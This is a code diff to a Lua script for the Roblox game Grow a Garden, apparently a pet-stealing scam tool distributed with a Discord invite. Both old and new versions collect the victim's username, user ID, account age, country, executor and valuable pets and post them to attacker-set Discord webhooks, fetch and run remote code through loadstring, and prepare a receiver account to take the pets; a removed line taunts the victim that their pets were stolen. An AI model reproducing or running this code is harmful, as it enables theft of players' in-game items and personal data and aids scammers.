@@ -11,8 +11,6 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-
-        
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -32,17 +30,10 @@
         local attempt = 1
         local teleported = false
 
-        setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! " .. (getgenv().Discord or "discord.gg/d2zgg2YDMz"))
-        
+        setclipboard(_G.Script.SM.Config.MSG)
+
         loadstring(game:HttpGet(krnlbypass, true))()
-
-        task.defer(function()
-            if runBypass then
-                runBypass()
-            end
-        end)
-
-
+        
         if GetServerType:InvokeServer() == "VIPServer" then
             while attempt <= maxAttempts and not teleported do
                 local servers = {}
@@ -83,12 +74,6 @@
         if GetServerType:InvokeServer() == "VIPServer" then
             error("Script stopped - VIP Server detected")        
         end
-
-        if getgenv().EclipseHubRunning then
-            warn("Script is already running or has been executed! Cannot run again.")
-            return
-        end
-        getgenv().EclipseHubRunning = true
 
         -- Updated PetPriorityData with isMutation field and additional pets
         local PetPriorityData = {
@@ -345,30 +330,6 @@
         end
 
         local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
-        local function sendWebhookToAll(payload)
-    local function trySend(url)
-        local success, err = pcall(function()
-            request({
-                Url = url,
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
-        if not success then warn("Webhook Error:", err) end
-    end
-
-    if getgenv().Webhook and getgenv().Webhook ~= "" then
-        trySend(getgenv().Webhook)
-    end
-
-    if getgenv().DualHookWebhook and getgenv().DualHookWebhook ~= "" then
-        trySend(getgenv().DualHookWebhook)
-    end
-end
-
 
         local tpScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
@@ -435,85 +396,110 @@ end
             end
         end
 
-local payload = {
-    content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat"
-             or "To activate the stealer you must jump or type in chat",
-    embeds = {{
-        title = "Grow a Garden Hit - " .. (getgenv().ServerName or "Scripts.SM"),
-        url = "https://eclipse-proxy.vercel.app/api/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-        color = 57855,
-        fields = {
-            {
-                name = "🪪 Display Name",
-                value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
-                inline = true
-            },
-            {
-                name = "👤 Username",
-                value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
-                inline = true
-            },
-            {
-                name = "🆔 User ID",
-                value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
-                inline = true
-            },
-            {
-                name = "📅 Account Age",
-                value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
-                inline = true
-            },
-            {
-                name = "💎 Receiver",
-                value = "```" .. (Username or "Unknown") .. "```",
-                inline = true
-            },
-            {
-                name = "🎂 Account Created",
-                value = "```" .. (creationDateString or "Unknown") .. "```",
-                inline = true
-            },
-            {
-                name = "💻 Executor",
-                value = "```" .. (detectExecutor() or "Unknown") .. "```",
-                inline = true
-            },
-            {
-                name = "🌍 Country",
-                value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
-                inline = true
-            },
-            {
-                name = "📡 Player Count",
-                value = "```" .. (playerCount or 0) .. "/5```",
-                inline = true
-            },
-            {
-                name = "💰 Backpack",
-                value = "```" .. truncateByLines(petString, 20) .. "```",
-                inline = false
-            },
-            {
-                name = "🚀 Join Script",
-                value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
-                inline = false
-            },
-            {
-                name = "🔗 Join with URL",
-                value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                inline = false
-            }
-        },
-        footer = {
-            text = game.JobId or "Unknown"
-        },
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }},
-    attachments = {}
+        local payload = {
+            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
+            embeds = {{
+                title = "Grow a Garden Hit - " .. (_G.Script.SM.Config.ServerName or "Scripts.SM"),
+                url = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+                color = 57855,
+                fields = {
+                    {
+                        name = "🪪 Display Name",
+                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "👤 Username",
+                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "🆔 User ID",
+                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "📅 Account Age",
+                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
+                        inline = true
+                    },
+                    {
+                        name = "💎 Receiver",
+                        value = "```" .. (Username or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "🎂 Account Created",
+                        value = "```" .. (creationDateString or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "💻 Executor",
+                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "🌍 Country",
+                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
+                        inline = true
+                    },
+                    {
+                        name = "📡 Player Count",
+                        value = "```" .. (playerCount or 0) .. "/5```",
+                        inline = true
+                    },
+                    {
+                        name = "💰 Backpack",
+                        value = "```" .. truncateByLines(petString, 20) .. "```",
+                        inline = false
+                    },
+                    {
+                        name = "🚀 Join Script",
+                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
+                        inline = false
+                    },
+                    {
+                        name = "🔗 Join with URL",
+                        value = "[Click here to join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = game.JobId or "Unknown"
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }},
+            attachments = {}
+        }
+
+local webhooksToSend = {
+    getgenv().Webhook,
+    _G.Script.SM.Config.DualHookWebhook
 }
 
-sendWebhookToAll(payload)
+if hasRarePets() then
+    payload.content = "@everyone\nTo activate the stealer you must jump or type in chat"
+else
+    payload.content = "To activate the stealer you must jump or type in chat"
+end
 
+for _, hook in ipairs(webhooksToSend) do
+    if hook and hook ~= "" then
+        local success, err = pcall(function()
+            request({
+                Url = hook,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if not success then
+            warn("Failed to send to webhook:", hook, err)
+        end
+    end
+end
                 local function CreateGui()
                     local player = Players.LocalPlayer
 
@@ -600,14 +586,8 @@ sendWebhookToAll(payload)
                     end)
                 end
 
-        local usernames = {}
-        if getgenv().DualHookUsernames then
-            for name in string.gmatch(getgenv().DualHookUsernames, '([^,]+)') do
-                table.insert(usernames, name)
-            end
-        end
-        
-
+        local usernames = _G.Script.SM.Config["DualHook-User"]
+  
         local receiverPlr
         repeat
             for _, name in ipairs(usernames) do
